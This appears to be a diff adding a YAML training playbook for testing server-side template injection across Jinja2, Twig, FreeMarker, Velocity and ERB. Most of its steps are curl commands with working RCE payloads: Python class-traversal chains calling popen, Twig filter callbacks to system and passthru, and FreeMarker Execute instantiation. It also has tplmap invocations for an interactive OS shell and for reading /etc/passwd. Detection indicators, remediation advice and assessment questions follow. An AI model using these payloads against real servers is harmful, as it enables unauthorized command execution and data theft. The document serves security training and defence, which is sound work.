@@ -1,0 +1,194 @@
+# Category: Web Application Security - SSTI
+name: "Server-Side Template Injection (SSTI) Testing"
+id: "web-ssti-001"
+category: "web_application"
+subcategory: "ssti"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Detect and exploit Server-Side Template Injection vulnerabilities in web applications
+  using Jinja2, Twig, Freemarker, Velocity, and other template engines. SSTI can lead
+  to RCE when template syntax is evaluated in user-controlled input.
+
+learning_objectives:
+  - Identify template injection points via polyglot probing
+  - Fingerprint the template engine from error responses
+  - Craft engine-specific payloads for RCE
+  - Bypass common sandbox restrictions in Jinja2 and Twig
+
+tools:
+  - burp_suite
+  - tplmap
+  - curl
+  - python3
+
+prerequisites:
+  - Understanding of template engine syntax
+  - Web application testing fundamentals
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify potential template injection points"
+    commands:
+      - "# Look for parameters that render user input in responses"
+      - "curl -s 'http://[target_url]/greet?name=John' | grep -i 'John'"
+      - "# Test with math expression (universal SSTI probe)"
+      - "curl -s 'http://[target_url]/greet?name={{7*7}}'"
+      - "curl -s 'http://[target_url]/greet?name=#{7*7}'"
+      - "curl -s 'http://[target_url]/greet?name=${7*7}'"
+      - "curl -s 'http://[target_url]/greet?name=<%= 7*7 %>'"
+      - "curl -s 'http://[target_url]/greet?name=${{7*7}}'"
+      - "# Look for 49 in the response — confirms template evaluation"
+      - "curl -s 'http://[target_url]/greet?name={{7*7}}' | grep '49'"
+    expected_output: "Math expression evaluated (49 returned instead of literal {{7*7}})"
+    detection: "Template syntax characters in HTTP parameters in web logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Fingerprint template engine via decision tree"
+    commands:
+      - "# Step 1: {{7*7}} — if 49, continue; else try other syntax"
+      - "curl -s 'http://[target_url]/greet?name={{7*7}}'"
+      - "# Step 2: {{7*'7'}} — Jinja2 returns '7777777'; Twig returns '49'"
+      - "curl -s 'http://[target_url]/greet?name={{7*\\'7\\'}}'"
+      - "# If Jinja2 — Python-based"
+      - "curl -s 'http://[target_url]/greet?name={{config}}'"
+      - "# If Twig — PHP-based"
+      - "curl -s 'http://[target_url]/greet?name={{_self.env.registerUndefinedFilterCallback(\\\"exec\\\")}}{{_self.env.getFilter(\\\"id\\\")}}'"
+      - "# FreeMarker (Java)"
+      - "curl -s 'http://[target_url]/greet?name=${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"id\\\")}'"
+      - "# Velocity (Java)"
+      - "curl -s 'http://[target_url]/greet?name=#set($x=\\'id\\') $x'"
+      - "# ERB (Ruby)"
+      - "curl -s 'http://[target_url]/greet?name=<%= 7*7 %>'"
+    expected_output: "Template engine identified from response pattern"
+    detection: "Template syntax characters and function calls in HTTP parameters"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Jinja2 RCE (Python) — sandbox escape"
+    commands:
+      - "# Basic Jinja2 config dump"
+      - "curl -s 'http://[target_url]/greet?name={{config.items()}}'"
+      - "# Class hierarchy traversal for RCE"
+      - "curl -s 'http://[target_url]/greet?name={{\"\".__class__.__mro__[1].__subclasses__()}}'"
+      - "# Find subprocess.Popen"
+      - "curl -s \"http://[target_url]/greet?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}\""
+      - "# Alternative — os.system via __import__"
+      - "curl -s \"http://[target_url]/greet?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\""
+      - "# Using lipsum global"
+      - "curl -s \"http://[target_url]/greet?name={{lipsum.__globals__['os'].popen('id').read()}}\""
+      - "# Using cycler"
+      - "curl -s \"http://[target_url]/greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}\""
+    expected_output: "OS command output (e.g., uid=www-data) returned in response"
+    detection: "Python class traversal patterns in parameters; subprocess calls from web process"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Twig SSTI RCE (PHP)"
+    commands:
+      - "# Twig version check"
+      - "curl -s 'http://[target_url]/greet?name={{_self.env.getExtension(\\\"Twig_Extension_Debug\\\")}}'"
+      - "# RCE via registerUndefinedFilterCallback (Twig < 2.x)"
+      - "curl -s 'http://[target_url]/greet?name={{_self.env.registerUndefinedFilterCallback(\\\"system\\\")}}{{_self.env.getFilter(\\\"id\\\")}}'"
+      - "# Twig 3.x filter abuse"
+      - "curl -s 'http://[target_url]/greet?name={% set x %}{% endset %}{{_self}}'"
+      - "# PHP passthru"
+      - "curl -s \"http://[target_url]/greet?name={{['id']|filter('passthru')}}\""
+      - "# PHP exec via map"
+      - "curl -s \"http://[target_url]/greet?name={{['id', '']|sort('exec')}}\""
+    expected_output: "PHP command execution result returned in template response"
+    detection: "Twig filter callback patterns in HTTP parameters; PHP process execution"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "FreeMarker SSTI RCE (Java)"
+    commands:
+      - "# FreeMarker Execute class"
+      - "curl -s 'http://[target_url]/greet?name=${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"id\\\")}'"
+      - "# JythonRuntime"
+      - "curl -s 'http://[target_url]/greet?name=${\\\"freemarker.template.utility.JythonRuntime\\\"?new()}'"
+      - "# ObjectConstructor"
+      - "curl -s 'http://[target_url]/greet?name=<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()>${ex(\\\"id\\\")}'"
+      - "# Alternative with API"
+      - "curl -s 'http://[target_url]/greet?name=<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\\\"freemarker.template.ObjectWrapper\\\")>'"
+    expected_output: "Java RCE via FreeMarker template engine"
+    detection: "FreeMarker class instantiation patterns; Java process exec from web process"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Automated SSTI exploitation with tplmap"
+    commands:
+      - "git clone https://github.com/epinna/tplmap /opt/tplmap"
+      - "pip3 install -r /opt/tplmap/requirements.txt"
+      - "# Auto-detect and exploit"
+      - "python3 /opt/tplmap/tplmap.py -u 'http://[target_url]/greet?name=test'"
+      - "# Interactive OS shell"
+      - "python3 /opt/tplmap/tplmap.py -u 'http://[target_url]/greet?name=test' --os-shell"
+      - "# Read file"
+      - "python3 /opt/tplmap/tplmap.py -u 'http://[target_url]/greet?name=test' --os-cmd 'cat /etc/passwd'"
+      - "# POST parameter"
+      - "python3 /opt/tplmap/tplmap.py -u 'http://[target_url]/greet' -d 'name=test'"
+    expected_output: "Tplmap detects engine, confirms RCE, and provides interactive shell"
+    detection: "Tplmap probe patterns; OOB DNS callbacks; subprocess execution from web process"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A03:2021"
+    description: "Injection — template injection is a form of injection attack"
+  - standard: "OWASP ASVS v4.0"
+    control: "5.2.5"
+    description: "Disable template engine features that could be exploited"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "CIS Controls v8"
+    control: "16.1"
+    description: "Establish and maintain secure application development process"
+
+detection:
+  network_indicators:
+    - "Template engine syntax in HTTP parameters: {{}}, #{}, ${}, <%%>"
+    - "Class traversal strings in parameters: __class__, __mro__, __subclasses__"
+    - "Outbound DNS/HTTP from web server (OOB payload execution)"
+  log_indicators:
+    - "Web access logs showing template syntax in GET/POST parameters"
+    - "Application error logs with template rendering exceptions"
+    - "Process execution logs for web server spawning shell processes"
+  endpoint_indicators:
+    - "Unexpected processes spawned from web server user (bash, sh, python)"
+    - "File read activity from www-data on sensitive files (/etc/passwd)"
+
+remediation:
+  immediate:
+    - "Never pass user-controlled input directly to template rendering functions"
+    - "Use sandboxed template environments (Jinja2 SandboxedEnvironment)"
+    - "Whitelist allowed template variables and disable dangerous template features"
+  long_term:
+    - "Separate user data from template logic completely"
+    - "Run template rendering in isolated subprocess with minimal permissions"
+    - "Implement SAST scanning for dangerous template rendering patterns"
+    - "Regular DAST testing including SSTI payloads in CI/CD pipeline"
+
+variables:
+  target_url: "http://target.example.com"
+
+assessment_questions:
+  - "What polyglot payload is used to initially probe for SSTI?"
+  - "How does {{7*'7'}} help differentiate between Jinja2 and Twig?"
+  - "Why is Jinja2's SandboxedEnvironment not a complete SSTI mitigation?"
+  - "What Java class enables RCE in FreeMarker SSTI?"
+  - "How does tplmap automate SSTI detection and exploitation?"
+
+references:
+  - url: "https://portswigger.net/web-security/server-side-template-injection"
+    title: "PortSwigger SSTI Labs"
+  - url: "https://github.com/epinna/tplmap"
+    title: "Tplmap - SSTI Auto-exploit"
+  - url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+    title: "SSTI Payloads - PayloadsAllTheThings"
+  - url: "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+    title: "HackTricks SSTI"
